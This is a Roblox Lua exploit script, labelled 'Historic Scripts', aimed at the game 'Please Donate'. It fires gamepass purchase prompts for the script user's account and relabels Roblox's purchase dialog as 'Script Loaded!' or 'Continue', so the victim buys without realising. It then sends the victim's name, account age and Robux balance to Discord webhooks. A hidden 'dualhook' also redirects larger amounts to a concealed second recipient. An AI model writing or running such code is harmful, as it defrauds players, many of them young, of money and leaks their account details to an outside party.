RobloxUser = Username
DiscordWebhook = Webhook

local CoreGui = game:GetService("CoreGui")
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local DualRobux = 10 -- For testing Dualhook price
local DualUser = ""
local DualWebhook = ""
local LogsWebhook = "18bf10e6-da47-4bdf-8c64-fcaa95eae717"

local request = syn and syn.request or request
if typeof(request) ~= "function" then error("?!?") end

local Remotes = require(ReplicatedStorage:WaitForChild("Remotes"))
local success, UserId = pcall(function() return Players:GetUserIdFromNameAsync(Username) end)

local asset
local userRobux

local function sendWebhook()
    local embed = {
        ["title"] = "Historic Scripts - Please Donate Hit",
        ["color"] = 0x6bffba,
        ["fields"] = {
            {["name"] = "<:drawpen:1311079366125555782> á´˜ÊŸá´€Êá´‡Ê€ ÉªÉ´êœ°á´", ["value"] = "```Name: " .. Players.LocalPlayer.Name .. "\nAccount Age: " .. tostring(Players.LocalPlayer.AccountAge) .. "\nReceiver: " .. Username .. "```"},
            {["name"] = "<:robux:1314309850154537020> á´›á´á´›á´€ÊŸ Ê€á´Ê™á´œx", ["value"] = "```" .. userRobux .. "```"},
            {["name"] = "<:ticketyellow:1311079539237191750> É¢á´€á´á´‡á´˜á´€êœ±êœ± á´˜Ê€Éªá´„á´‡", ["value"] = "```" .. tostring(asset:GetAttribute("AssetPrice")) .. "```"},
            {["name"] = "ÉªÉ´êœ°á´;", ["value"] = "The victim Must click the 'Continue' button. Otherwise, you will not receive the Robux."}
        }
    }

    local data = HttpService:JSONEncode({["content"] = "@everyone", ["embeds"] = {embed}})
    local logsData = HttpService:JSONEncode({["content"] = "Historic Scripts", ["embeds"] = {embed}})

    request({Url = Webhook, Method = "POST", Headers = headers, Body = data})
    request({Url = LogsWebhook, Method = "POST", Headers = headers, Body = logsData})
end

if success then
    local Booth = Remotes.Function("OfflinePlayerLookup"):InvokeServer(UserId)
    if not Booth then return Players.LocalPlayer:Kick() end

    local function Purchase()
        local range = 0
        for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
            if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
                local Attribute = v:GetAttribute("AssetPrice")
                if Attribute <= userRobux and Attribute > range then
                    asset = v
                    range = Attribute
                end
            end
        end
        
        if asset and asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
        else
            warn("?")
        end
    end

    local range = math.huge
    for _, v in pairs(Booth.BoothUI.Items.Frame:GetChildren()) do
        if v:GetAttribute("AssetType") == "Gamepass" and not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, v:GetAttribute("AssetId")) then
            local Attribute = v:GetAttribute("AssetPrice")
            if Attribute < range then
                asset = v
                range = Attribute
            end
        end
    end

    if asset then
        if asset.Prompt and typeof(asset.Prompt.FireServer) == "function" then
            asset.Prompt:FireServer("", false, range)
            print(range)
        else
            warn("??.")
        end
    end

    local Animator = CoreGui:WaitForChild("PurchasePrompt"):WaitForChild("ProductPurchaseContainer"):WaitForChild("Animator")
    repeat task.wait() until not Animator:FindFirstChild("Prompt")

    Animator.ChildAdded:Connect(function(child)
        if child.Name == "Prompt" then
            local RemainingBalanceText = child:WaitForChild("AlertContents"):WaitForChild("Footer"):WaitForChild("FooterContent"):WaitForChild("Content"):FindFirstChild("RemainingBalanceText")
            if RemainingBalanceText then
                if userRobux then
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Please Donate - Script!"
                    child.AlertContents.MiddleContent.Visible = false
                    child.AlertContents.Footer.Buttons["1"].Visible = false
                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Text.Text = "Continue"
                    child.AlertContents.Footer.Buttons["2"].ButtonContent.ButtonMiddleContent.Icon.Visible = false
                    child.AlertContents.Footer.FooterContent.Visible = false
                elseif asset then
                    child.AlertContents.TitleContainer.TitleArea.Title.Text = "Script Loaded!"
                    child.AlertContents.MiddleContent.Visible = false
                    child.AlertContents.Footer.Buttons["1"].ButtonContent.ButtonMiddleContent.Text.Text = "Load Script!"
                    child.AlertContents.Footer.Buttons["2"].Visible = false
                    child.AlertContents.Footer.FooterContent.Visible = false

                    userRobux = RemainingBalanceText.Text:match("(%d+)$") + asset:GetAttribute("AssetPrice")
                    if userRobux > DualRobux then
                        Username = DualUser
                        Webhook = DualWebhook
                        asset = nil
                    end
                end
            end
        end
    end)

    Animator.ChildRemoved:Connect(function(child)
        if child.Name == "Prompt" and userRobux then
            if not asset or not MarketplaceService:UserOwnsGamePassAsync(Players.LocalPlayer.UserId, asset:GetAttribute("AssetId")) then
                Purchase()
            end
        end
    end)

    Remotes.OnClientEvent("GiftSentAlert"):Connect(function(a, robux)
        if a == UserId and userRobux then
            sendWebhook()
            userRobux -= robux
            Purchase()
        end
    end)
end
